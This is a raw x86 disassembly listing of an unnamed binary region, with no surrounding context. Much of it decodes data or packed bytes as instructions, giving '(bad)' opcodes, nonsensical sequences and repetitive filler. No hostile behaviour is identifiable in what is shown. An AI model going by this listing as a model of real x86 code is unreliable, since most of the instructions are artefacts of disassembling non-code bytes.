  433165:	mov    esi,DWORD PTR [ebx]
  433167:	adc    al,0x9c
  433169:	inc    ebp
  43316a:	(bad)  
  43316b:	mov    ebx,eax
  43316d:	adc    al,0x85
  43316f:	cmp    al,0x1
  433172:	inc    ebp
  433173:	add    BYTE PTR ds:0xe98b9c4d,bh
  433179:	mov    eax,DWORD PTR [ebx]
  43317b:	nop
  43317c:	add    BYTE PTR [eax],al
  43317e:	inc    ebp
  43317f:	mov    esi,DWORD PTR [ebx]
  433181:	add    eax,DWORD PTR [ebx]
  433183:	cmp    al,0x89
  433185:	mov    esp,esi
  433187:	clc    
  433188:	inc    ebp
  433189:	inc    ebp
  43318a:	add    edx,DWORD PTR [esi+0xc]
  43318d:	mov    edi,0x7ff0845
  433192:	in     al,dx
  433193:	(bad)  
  433194:	jne    0x433131
  433196:	mov    esi,DWORD PTR [edx]
  433198:	clc    
  433199:	add    ebp,DWORD PTR [esi]
  43319b:	mov    edi,edi
  43319d:	in     al,dx
  43319e:	mov    DWORD PTR [ebp-0x10],eax
  4331a1:	xor    eax,DWORD PTR [ebp+0x3]
  4331a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4331b0:	lea    ecx,[ecx+0x45e8d4bc]
  4331b6:	clc    
  4331b7:	mov    edi,edi
  4331b9:	cmp    BYTE PTR [ebp+0x4d],al
  4331bc:	test   DWORD PTR [eax+0x74],ecx
  4331bf:	inc    ecx
  4331c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331c6:	ret    
  4331c7:	inc    eax
  4331c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331ce:	push   eax
  4331cf:	dec    eax
  4331d0:	test   al,0xd0
  4331d2:	dec    eax
  4331d4:	mov    eax,DWORD PTR [ebp-0x14]
  4331d7:	mov    eax,DWORD PTR [ebp+0x38]
  4331da:	mov    eax,ecx
  4331dc:	fadd   DWORD PTR [ebx]
  4331de:	dec    ebp
  4331df:	inc    eax
  4331e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331e6:	inc    ebp
  4331e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4331ed:	fadd   QWORD PTR [ebx]
  4331ef:	inc    ebp
  4331f0:	or     al,0x33
  4331f2:	dec    ebp
  4331f3:	add    edi,DWORD PTR [ebx]
  4331f5:	mov    DWORD PTR [edx-0x28],esi
  4331f8:	mov    eax,DWORD PTR [ebp-0x10]
  4331fb:	mov    eax,DWORD PTR [eax+0x10]
  4331fe:	mov    eax,edi
  433200:	lock ret 
  433202:	inc    ecx
  433203:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433209:	fsubr  st,st(5)
  43320b:	test   DWORD PTR [eax],eax
  43320d:	clc    
  43320e:	push   0x45
  433210:	(bad)  
  433211:	cmp    al,0xec
  433213:	pushf  
  433214:	inc    ebp
  433215:	(bad)  
  433216:	push   eax
  433217:	fsub   DWORD PTR [eax-0x7b]
  43321a:	(bad)  
  43321b:	clc    
  43321c:	mov    eax,0xf8008584
  433221:	mov    eax,DWORD PTR [ebp-0x4]
  433224:	mov    edi,0x4585c3cc
  43322a:	clc    
  43322b:	mov    eax,DWORD PTR [ebp+0x14]
  43322e:	xor    eax,DWORD PTR [ebp-0x64]
  433231:	mov    edi,eax
  433233:	in     al,dx
  433234:	les    esi,FWORD PTR [ebp-0x7b]
  433237:	mov    edi,eax
  433239:	or     al,0x4d
  43323b:	dec    ebp
  43323c:	mov    eax,ebp
  43323e:	in     al,0xf2
  433240:	dec    ebp
  433241:	dec    DWORD PTR [ecx+0x4dc7e045]
  433247:	fmul   DWORD PTR [ecx+0x4df8f085]
  43324d:	inc    ebp
  43324e:	mov    DWORD PTR [ebx],esi
  433250:	fadd   QWORD PTR [ebx]
  433252:	dec    ebp
  433253:	push   eax
  433254:	xor    eax,DWORD PTR [ebp+0x3]
  433257:	push   eax
  433258:	mov    DWORD PTR [eax+ebx*8],ebx
  43325b:	push   esi
  43325d:	mov    eax,DWORD PTR [eax]
  43325f:	lock cmp eax,0xf84e85c0
  433265:	inc    ebp
  433266:	test   BYTE PTR [ebx],dh
  433268:	add    DWORD PTR [ebx],eax
  43326a:	add    BYTE PTR [eax+0x4d],dl
  43326d:	jne    0x4332a2
  43326f:	lea    ecx,[ebx-0x7617fc44]
  433275:	div    ah
  433277:	inc    DWORD PTR [ebp+0x45]
  43327a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433280:	jb     0x43320d
  433282:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433289:	mov    ecx,DWORD PTR [ebp-0x10]
  43328c:	xor    ecx,DWORD PTR [ebp+0x3]
  43328f:	mov    edi,DWORD PTR [ebx]
  433291:	adc    BYTE PTR [ebp+0x41],dh
  433294:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43329a:	ret    
  43329b:	push   ss
  43329c:	push   0x45
  43329e:	lea    ecx,[ebx+0x4de80cb0]
  4332a4:	sti    
  4332a5:	add    edi,edi
  4332a7:	or     BYTE PTR [ebp+0x4d],al
  4332aa:	mov    ebp,DWORD PTR [ebx]
  4332ac:	xor    ebp,ecx
  4332ae:	mov    al,BYTE PTR [edx]
  4332b0:	add    eax,0xc7200
  4332b5:	jne    0x433304
  4332b7:	lea    esi,[ebx]
  4332b9:	mov    al,0xf
  4332bb:	call   0xf2980
  4332c0:	shl    DWORD PTR [ecx],0x84
  4332c3:	pushf  
  4332c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332ca:	mov    esi,DWORD PTR [edx]
  4332cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332d3:	test   DWORD PTR [eax],eax
  4332d5:	clc    
  4332d6:	dec    ebp
  4332d7:	inc    ebp
  4332d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4332db:	pushf  
  4332dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332e3:	lea    eax,[ecx]
  4332e5:	int3   
  4332e6:	add    BYTE PTR [ebp+0x45],cl
  4332e9:	lea    ecx,[ebx-0x75b2cc38]
  4332ef:	lea    eax,ds:0x4d72c4
  4332f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4332f8:	xor    ecx,edi
  4332fa:	bswap  ebx
  4332fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433300:	rol    DWORD PTR [ecx],0x84
  433303:	add    BYTE PTR [ecx],al
  433305:	xor    eax,DWORD PTR [eax]
  433307:	pushf  
  433308:	inc    ebp
  433309:	jnp    0x8a43670c
  43330f:	mov    eax,DWORD PTR ds:0xcf72e8
  433315:	lock dec ebp
  433317:	retf   
  433318:	xor    ecx,DWORD PTR [ebp+0xf]
  43331b:	mov    eax,eax
  43331d:	fmul   st,st(3)
  43331f:	test   ecx,0x19b8484
  433325:	xor    al,BYTE PTR [eax]
  433327:	mov    DWORD PTR [ebp-0x28],eax
  43332a:	mov    eax,DWORD PTR [ebp+0x33]
  43332d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433333:	ret    
  433334:	add    al,cl
  433336:	dec    ebp
  433337:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43333d:	add    ecx,DWORD PTR ds:0xc7250
  433343:	inc    ebp
  433344:	rcl    DWORD PTR [eax+0x4d],0x2b
  433348:	mov    edi,edi
  43334a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433350:	jb     0x433319
  433352:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433359:	mov    esi,DWORD PTR [ebx]
  43335b:	cld    
  43335c:	mov    cl,bh
  43335e:	or     eax,0x372b6
  433363:	cmp    ecx,eax
  433365:	jne    0x4333e2
  43336b:	mov    eax,DWORD PTR [ebp-0x20]
  43336e:	mov    eax,DWORD PTR [eax]
  433370:	xor    eax,edi
  433372:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433379:	mov    ecx,DWORD PTR [ebp-0x4]
  43337c:	mov    ecx,edi
  43337e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433384:	jb     0x433395
  433386:	add    BYTE PTR [edi-0x3f],dl
  433389:	add    BYTE PTR [ebp-0x75],cl
  43338c:	mov    esi,eax
  43338e:	xor    eax,DWORD PTR [eax]
  433390:	mov    al,bh
  433392:	or     eax,0x4b7284
  433397:	xor    al,cl
  433399:	mov    ecx,DWORD PTR [ebp-0x4]
  43339c:	mov    ecx,edi
  43339e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333a4:	jb     0x4333b5
  4333a6:	add    BYTE PTR [edi],dh
  4333a8:	enter  0x8500,0x8b
  4333ac:	add    ah,bl
  4333ae:	add    BYTE PTR [eax],al
  4333b0:	inc    ebp
  4333b1:	(bad)  
  4333b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333b9:	mov    esi,DWORD PTR [edx-0x4]
  4333bc:	add    bh,cl
  4333be:	dec    ebp
  4333bf:	mov    dh,0x8b
  4333c1:	add    esi,DWORD PTR [ebx]
  4333c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333c9:	add    BYTE PTR [eax],al
  4333cb:	mov    eax,ecx
  4333cd:	loopne 0x43341c
  4333cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333d5:	dec    ebx
  4333d6:	or     eax,0x8b7232
  4333db:	in     al,0xc1
  4333dd:	or     DWORD PTR [ebp-0x31],ecx
  4333e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333e7:	xor    dh,BYTE PTR [edx-0x75]
  4333ea:	add    al,dh
  4333ec:	enter  0x4f09,0xcf
  4333f0:	inc    ebp
  4333f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4333f7:	or     al,BYTE PTR ds:0xe4728b
  4333fd:	or     DWORD PTR [ebp-0x31],ecx
  433400:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433407:	cmp    dh,BYTE PTR [edx+0xf]
  43340a:	add    bl,dl
  43340c:	rol    DWORD PTR [eax],0x4d
  43340f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433415:	(bad)  
  433416:	or     eax,0x4b7284
  43341b:	xor    al,cl
  43341d:	mov    ecx,DWORD PTR [ebp-0x20]
  433420:	mov    ecx,DWORD PTR [ecx]
  433422:	xor    ecx,edi
  433424:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43342b:	xor    cl,al
  43342d:	mov    ecx,DWORD PTR [edi]
  43342f:	fadd   QWORD PTR [ebp+0x9]
  433432:	call   0xffd02f06
  433437:	dec    ebx
  433438:	dec    ebp
  433439:	xor    bh,BYTE PTR [ebx]
  43343b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43343f:	loopne 0x43343d
  433441:	or     edi,eax
  433443:	iret   
  433444:	ret    
  433445:	mov    WORD PTR [ebp+0x4f],es
  433448:	mov    esi,DWORD PTR [edx]
  43344a:	call   0x8452fb89
  43344f:	(bad)  
  433450:	fwait
  433451:	add    BYTE PTR [edx],dh
  433453:	mov    esi,DWORD PTR [ebx]
  433455:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43345b:	test   BYTE PTR [ebx],dh
  43345d:	dec    ebx
  43345e:	add    esi,DWORD PTR [edx]
  433460:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433466:	dec    edi
  433468:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43346f:	xor    al,BYTE PTR [ebx]
  433471:	mov    edi,DWORD PTR [ebx]
  433473:	in     al,0x75
  433475:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43347b:	dec    ebx
  43347c:	xor    esi,DWORD PTR [edx]
  43347e:	lea    ecx,[edx]
  433480:	or     BYTE PTR [ebx+0x900f072],cl
  433486:	ja     0x433457
  433488:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43348f:	cmp    ch,al
  433491:	jne    0x433486
  433493:	mov    edi,edi
  433495:	fadd   QWORD PTR [ebp+0x0]
  433498:	mov    eax,edi
  43349a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334a1:	mov    edx,DWORD PTR [ebx]
  4334a3:	in     al,0x45
  4334a5:	or     DWORD PTR [ebx],esi
  4334a7:	iret   
  4334a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334af:	xor    dl,BYTE PTR [eax-0x75]
  4334b2:	sbb    al,0xe0
  4334b4:	dec    DWORD PTR [ecx]
  4334b6:	mov    ecx,edi
  4334b8:	in     al,dx
  4334b9:	mov    eax,es
  4334bb:	dec    ebx
  4334bc:	mov    DWORD PTR [edx],esi
  4334be:	fmul   QWORD PTR [edx]
  4334c0:	jne    0x43344d
  4334c2:	(bad)  
  4334c3:	(bad)  
  4334c5:	or     DWORD PTR [ebp-0x31],eax
  4334c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334cf:	cmp    bh,bh
  4334d1:	jne    0x433518
  4334d3:	lea    ecx,[ebx-0x38372750]
  4334d9:	inc    ebx
  4334db:	mov    eax,ecx
  4334dd:	mov    eax,0xa00c111
  4334e2:	jne    0x433529
  4334e4:	mov    esi,DWORD PTR [ebx]
  4334e6:	test   al,0x3
  4334e8:	inc    ebp
  4334e9:	mov    DWORD PTR [eax-0xc],edx
  4334ec:	loop   0x433533
  4334ee:	push   DWORD PTR [ebx]
  4334f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4334f6:	add    DWORD PTR [eax],eax
  4334f8:	mov    eax,edi
  4334fa:	lods   al,BYTE PTR ds:[esi]
  4334fb:	dec    ebp
  4334fc:	inc    ebp
  4334fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433503:	retf   
  433504:	mov    edx,ecx
  433506:	adc    al,0x84
  433508:	(bad)  
  433509:	std    
  43350a:	ret    
  43350b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433511:	hlt    
  433512:	rol    edi,0x82
  433515:	ret    
  433516:	cld    
  433517:	enter  0x11ff,0x45
  43351b:	inc    ebp
  43351c:	pop    edi
  43351d:	mov    ebx,DWORD PTR [ebx+0x14]
  433520:	ret    0xc7
  433523:	test   BYTE PTR [ebx+0x4532519b],cl
  433529:	jmp    0x4334b6
  43352b:	push   0x8
  43352d:	call   DWORD PTR [esi]
  43352f:	in     al,dx
  433530:	add    BYTE PTR [ebp+0x1],0x50
  433534:	add    bh,ah
  433536:	add    bh,bh
  433538:	icebp  
  433539:	mov    ecx,DWORD PTR [eax]
  43353b:	cld    
  43353c:	pop    es
  43353d:	dec    ebp
  43353e:	shl    DWORD PTR [ebx],0x72
  433541:	add    eax,DWORD PTR [eax]
  433543:	cmp    edx,ecx
  433545:	je     0x433557
  433547:	mov    esi,DWORD PTR [ebp-0x4]
  43354a:	inc    edi
  43354c:	or     al,0xc3
  43354e:	jmp    FWORD PTR [edx-0x18]
  433551:	(bad)  
  433552:	sti    
  433553:	cwde   
  433554:	(bad)  
  433555:	call   0xffa12e60
  43355a:	or     al,0x45
  43355c:	push   ebp
  43355d:	sub    esp,0x18
  433560:	push   ebx
  433561:	inc    ebp
  433562:	mov    edi,edi
  433564:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43356b:	test   al,0x54
  43356d:	inc    ebp
  43356e:	push   ecx
  43356f:	push   eax
  433570:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433576:	add    ah,bh
  433578:	(bad)  
  433579:	dec    ebp
  43357a:	add    DWORD PTR [ebx],esi
  43357c:	inc    ebp
  43357d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433583:	push   0xffffff8b
  433585:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43358b:	add    eax,DWORD PTR [ecx]
  43358d:	or     BYTE PTR [eax],al
  43358f:	call   0xff852d94
  433594:	mov    eax,DWORD PTR [ebp+0x14]
  433597:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43359d:	inc    ebp
  43359e:	dec    ecx
  43359f:	add    ebp,DWORD PTR [edx+0x14]
  4335a2:	push   0x8b3045
  4335a7:	call   0x33ad831c
  4335ac:	inc    DWORD PTR [ebx]
  4335ae:	mov    DWORD PTR [edi],ecx
  4335b0:	mov    eax,ecx
  4335b2:	or     BYTE PTR [ebp-0x3d],cl
  4335b5:	cmp    eax,edi
  4335b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335c2:	adc    al,0xc9
  4335c4:	inc    ebp
  4335c5:	adc    BYTE PTR [eax+0x55],dl
  4335c8:	jne    0x4335b6
  4335ca:	call   0xff54355a
  4335cf:	dec    ebp
  4335d0:	inc    ebp
  4335d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335d7:	add    BYTE PTR [ebx],bh
  4335d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335dd:	push   esp
  4335de:	or     al,0x51
  4335e0:	dec    ebp
  4335e1:	xor    DWORD PTR [ebx],0xf32039b
  4335e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4335ea:	mov    edi,edi
  4335ec:	pop    edi
  4335ed:	adc    BYTE PTR [ebx+0x75],bl
  4335f0:	ret    0x50
  4335f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4335f7:	(bad)  
  4335f8:	clc    
  4335f9:	mov    esp,ebp
  4335fb:	pop    ecx
  4335fc:	mov    ecx,0xf80085c2
  433601:	mov    ecx,DWORD PTR [ecx+edx*2]
  433604:	push   esi
  433605:	push   esi
  433606:	(bad)  
  433607:	lock add DWORD PTR [ebp+0x44],eax
  43360b:	mov    edx,DWORD PTR [eax]
  43360d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433611:	or     BYTE PTR [edi+eax*1+0x51],dl
  433615:	ret    
  433616:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43361c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433622:	or     al,0x80
  433624:	jge    0x433627
  433626:	mov    DWORD PTR [eax],eax
  433628:	and    al,0x8
  43362a:	cmp    DWORD PTR [ebp+0x10],eax
  43362d:	mov    edx,DWORD PTR [esi]
  43362f:	xchg   esp,eax
  433630:	dec    esp
  433631:	add    BYTE PTR [eax],dl
  433633:	mov    ecx,edx
  433635:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433639:	dec    ebp
  43363a:	into   
  43363b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433641:	mov    edx,DWORD PTR [eax+0x14]
  433644:	das    
  433645:	add    al,0x45
  433647:	add    BYTE PTR [ebp+0x0],dh
  43364a:	mov    edi,edi
  43364c:	and    al,0x50
  43364e:	mov    eax,DWORD PTR [eax]
  433650:	and    al,0xd1
  433652:	xor    eax,DWORD PTR [esi]
  433654:	lea    eax,[ebp+0x8]
  433657:	xor    esi,DWORD PTR [edx+0x3]
  43365a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433660:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433666:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433670:	cmp    al,0xff
  433672:	pushf  
  433673:	mov    edi,edi
  433675:	or     BYTE PTR [esi+ecx*1],cl
  433678:	jne    0x43363d
  43367a:	call   0xc3646
  43367f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433683:	mov    ebx,DWORD PTR [eax]
  433685:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433689:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433691:	pop    esi
  433692:	and    al,0xc9
  433694:	and    al,0x10
  433696:	call   DWORD PTR [ebp-0x73]
  433699:	in     al,dx
  43369a:	jmp    esp
  43369c:	je     0x433621
  43369e:	call   DWORD PTR [eax]
  4336a0:	and    al,0x31
  4336a2:	call   0xffcd3543
  4336a7:	and    al,0x44
  4336a9:	push   edi
  4336aa:	or     al,0x41
  4336ac:	pop    esi
  4336ad:	mov    ebp,esp
  4336af:	and    al,0xc2
  4336b1:	mov    eax,DWORD PTR [eax]
  4336b3:	and    al,0x85
  4336b5:	mov    edx,0x733080e
  4336ba:	jne    0x4336b6
  4336bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4336c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4336c8:	sbb    BYTE PTR [esp+edx*1],cl
  4336cb:	jl     0x4336cc
  4336cd:	adc    al,0x24
  4336cf:	dec    ebp
  4336d0:	mov    esi,DWORD PTR [ebp+0xc]
  4336d3:	mov    ecx,DWORD PTR [eax]
  4336d5:	and    al,0x39
  4336d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4336da:	or     BYTE PTR [eax+edx*1],ah
  4336dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4336e4:	clc    
  4336e5:	jmp    0x433683
  4336e7:	adc    al,bh
  4336e9:	inc    esp
  4336ea:	je     0x433738
  4336ec:	and    al,0xc2
  4336ee:	je     0x43368b
  4336f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4336f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4336fc:	sbb    al,0x10
  4336fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433702:	add    BYTE PTR [ebx+0xb],dh
  433705:	adc    BYTE PTR [eax],al
  433707:	mov    WORD PTR ds:0x3d450010,?
  43370d:	adc    BYTE PTR [eax],al
  43370f:	add    DWORD PTR [eax+edx*1],esp
  433712:	add    BYTE PTR [edx+0x6],cl
  433715:	adc    BYTE PTR [eax],al
  433717:	sub    dx,WORD PTR [eax]
  43371a:	add    bh,dl
  43371c:	imul   edx,DWORD PTR [eax],0x10302300
  433722:	add    BYTE PTR [esi-0x4ffef89],dl
  433728:	ss inc ebx
  43372a:	add    bh,bh
  43372c:	ss inc ebx
  43372e:	add    BYTE PTR [ebx],al
  433730:	aaa    
  433731:	inc    ebx
  433732:	add    BYTE PTR [edi],al
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [ebx],cl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [edi],cl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [eax+0x9001011],ah
  433758:	jo     0x43376a
  43375a:	add    BYTE PTR ds:0xd7001027,ch
  433760:	pop    eax
  433761:	adc    BYTE PTR [eax],al
  433763:	push   es
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [esi+0x33001031],ah
  43376c:	ins    BYTE PTR es:[edi],dx
  43376d:	adc    BYTE PTR [eax],al
  43376f:	jb     0x4337b0
  433771:	adc    BYTE PTR [eax],al
  433773:	push   ebx
  433774:	aaa    
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    dh,cl
  433794:	jge    0x4337a6
  433796:	add    BYTE PTR [esi-0x3dffef8e],dl
  43379c:	or     dl,BYTE PTR [eax]
  43379e:	add    dh,bl
  4337a0:	sub    dl,BYTE PTR [eax]
  4337a2:	add    BYTE PTR [edx],bl
  4337a4:	ins    BYTE PTR es:[edi],dx
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	addr16 jno 0x4337ba
  4337aa:	add    BYTE PTR [ebp+0x3d],ch
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	lds    esp,FWORD PTR [eax+0x10]
  4337b2:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337b8:	aaa    
  4337b9:	inc    ebx
  4337ba:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337c0:	aaa    
  4337c1:	inc    ebx
  4337c2:	add    BYTE PTR [ebx-0x58ffbcc9],ah
  4337c8:	aaa    
  4337c9:	inc    ebx
  4337ca:	add    BYTE PTR [ebx-0x50ffbcc9],ch
  4337d0:	aaa    
  4337d1:	inc    ebx
  4337d2:	add    BYTE PTR [esp+edx*1],bh
  4337d5:	adc    BYTE PTR [eax],al
  4337d7:	clc    
  4337d8:	cmp    dl,BYTE PTR [eax]
  4337da:	add    BYTE PTR [ecx],ah
  4337dc:	pop    ds
  4337dd:	adc    BYTE PTR [eax],al
  4337df:	mov    edi,0x6001073
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [ecx+0x34],bh
  4337e9:	adc    BYTE PTR [eax],al
  4337eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4337ef:	shl    DWORD PTR [edx+0x10],1
  4337f2:	add    bl,dl
  4337f4:	aaa    
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    BYTE PTR [ebp+0x14],al
  433815:	adc    BYTE PTR [eax],al
  433817:	fwait
  433818:	pop    ds
  433819:	adc    BYTE PTR [eax],al
  43381b:	jnp    0x433840
  43381d:	adc    BYTE PTR [eax],al
  43381f:	pop    esi
  433820:	adc    BYTE PTR cs:[eax],al
  433823:	popf   
  433824:	jno    0x433836
  433826:	add    ah,bl
  433828:	inc    ebp
  433829:	adc    BYTE PTR [eax],al
  43382b:	sbb    edx,DWORD PTR [edx+0x10]
  43382e:	add    BYTE PTR [edx+0x13001029],bl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	push   esp
  433854:	xor    al,0x4b
  433856:	aaa    
  433857:	pop    edi
  433858:	inc    edx
  433859:	dec    ebx
  43385a:	xor    DWORD PTR [ecx],edi
  43385c:	push   edi
  43385d:	add    BYTE PTR [ecx+0x39],cl
  433860:	xor    al,0x5f
  433862:	pop    ecx
  433863:	inc    edi
  433864:	push   edx
  433865:	pop    edi
  433866:	dec    edx
  433867:	xor    al,BYTE PTR [edx+0x30]
  43386a:	push   ebx
  43386b:	add    BYTE PTR [ecx+0x4a],cl
  43386e:	cmp    BYTE PTR [edi+0x38],bl
  433871:	xor    al,0x43
  433873:	xor    bl,BYTE PTR [eax+0x36]
  433876:	pop    edi
  433877:	inc    ebx
  433878:	add    BYTE PTR [edx+0x33],cl
  43387b:	dec    ebp
  43387c:	cmp    BYTE PTR [edi+0x53],bl
  43387f:	xor    DWORD PTR [eax],edi
  433881:	pop    edx
  433882:	pop    edi
  433883:	xor    BYTE PTR [edx+0x52],cl
  433886:	inc    ecx
  433887:	add    BYTE PTR [edx+0x42],al
  43388a:	inc    ebp
  43388b:	pop    edi
  43388c:	cmp    DWORD PTR [eax],edi
  43388e:	push   ebp
  43388f:	inc    edx
  433890:	xor    eax,0x5244505f
  433895:	xor    BYTE PTR [eax],al
  433897:	inc    edx
  433898:	inc    esp
  433899:	inc    edx
  43389a:	cmp    DWORD PTR [edi+0x52],ebx
  43389d:	dec    esp
  43389e:	inc    ebp
  43389f:	add    BYTE PTR [ebx+0x37],dl
  4338a2:	push   esp
  4338a3:	xor    BYTE PTR [edi+0x55],bl
  4338a6:	push   ebx
  4338a7:	aaa    
  4338a8:	dec    ebp
  4338a9:	pop    edi
  4338aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4338ad:	dec    ebx
  4338ae:	add    BYTE PTR [edx+0x47],cl
  4338b1:	inc    edi
  4338b2:	xor    eax,0x534e5f32
  4338b7:	push   esp
  4338b8:	pop    edi
  4338b9:	push   esp
  4338ba:	inc    edx
  4338bb:	add    BYTE PTR [ebx+0x4d],al
  4338be:	xor    BYTE PTR [edi+0x47],bl
  4338c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4338c4:	push   eax
  4338c5:	push   ecx
  4338c6:	push   ecx
  4338c7:	pop    edi
  4338c8:	inc    ebx
  4338c9:	push   edi
  4338ca:	push   esi
  4338cb:	add    BYTE PTR [ecx+0x57],cl
  4338ce:	inc    ebp
  4338cf:	pop    edi
  4338d0:	pop    ecx
  4338d1:	push   edx
  4338d2:	inc    edx
  4338d3:	pop    edi
  4338d4:	inc    edi
  4338d5:	add    BYTE PTR [ebx+0x51],dl
